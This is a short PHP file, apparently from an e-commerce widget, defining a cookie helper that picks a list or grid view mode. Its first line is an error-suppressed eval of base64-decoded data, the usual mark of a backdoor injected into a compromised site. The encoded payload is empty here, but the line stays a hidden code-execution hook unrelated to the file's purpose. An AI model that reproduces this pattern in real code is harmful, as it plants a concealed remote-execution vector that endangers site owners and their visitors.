<?php @eval(base64_decode(""));
if (!function_exists('widgetGetCookie')) {
	function widgetGetCookie($key, $default='ynstore_ul_listing'){
		$key_replace = str_replace('.','_',$key);
		if(isset($_COOKIE) && isset($_COOKIE[$key_replace])){
			$value = strtolower($_COOKIE[$key_replace]);
			switch($value){
				case 'ynstore_ul_listing':
				case 'ynstore_ul_grid':
					return $value;
			}
			return $default;
		}
		else {
			return $default;
		}
	}
}
?>